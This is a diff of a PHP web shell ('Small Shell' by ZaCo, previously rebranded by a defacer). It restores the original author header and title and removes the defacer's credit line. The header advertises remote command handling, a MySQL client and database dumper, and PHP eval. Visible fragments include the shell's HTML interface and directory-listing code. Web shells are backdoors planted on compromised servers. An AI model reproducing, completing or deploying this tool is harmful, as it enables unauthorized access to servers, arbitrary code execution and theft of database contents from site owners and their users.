@@ -1,11 +1,12 @@
 <?
   ##########################################################
- # Small Shell - Edited By KingDefacer                      #
+ # Small PHP Web Shell by ZaCo (c) 2004-2006                #
  #  +POST method                                            #
  #  +MySQL Client+Dumper for DB  and tables                 #
  #  +PHP eval in text format and html for phpinfo() example #
- # PREVED: sn0w, Zadoxlik, KingDefacer, Rebz, SkvoznoY      #
- # All bugs -> alturks.com                                  #
+ # PREVED: sn0w, Zadoxlik, Rebz, SkvoznoY, PinkPanther      #
+ # For antichat.ru and cup.su friends usage                 #
+ # All bugs -> mailo:zaco@yandex.ru                         #
  # Just for fun :)                                          #
   ##########################################################
 error_reporting(E_ALL);
@@ -39,7 +40,7 @@ return $perms;
 $head=<<<headka
 <html>
 <head>
-<title>Small Shell - Edited By KingDefacer</title>
+<title>Small Web Shell by ZaCo</title>
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
 </head>
 <body link=palegreen vlink=palegreen text=palegreen bgcolor=#2B2F34>
@@ -174,7 +175,7 @@ else {$not_dirs[]=$fn;}
 for($i=0;$i<sizeof($not_dirs);$i++)
 {
 $fn=$not_dirs[$i];
-echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.(is_link($work_dir.$fn)?$e_work_dir.readlink($work_dir.$fn):$e_work_dir.str_replace('"','&quot;',$fn)).'";document.list.submit();\'>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</a>'.str_repeat(' ',format-strlen($fn))); 
+echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.(is_link($work_dir.$fn)?$e_work_dir.readlink($work_dir.$fn):$e_work_dir.str_replace('"','&quot;',$fn)).'";document.list.submit();\'>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</a>'.str_repeat(' ',format-strlen($fn)));
 if($winda===false)
 {
 $owner=@posix_getpwuid(@fileowner($work_dir.$fn));
@@ -498,5 +499,3 @@ break;
 }
 }
 ?>
-
-<h1>Edited By KingDefacer<h1>
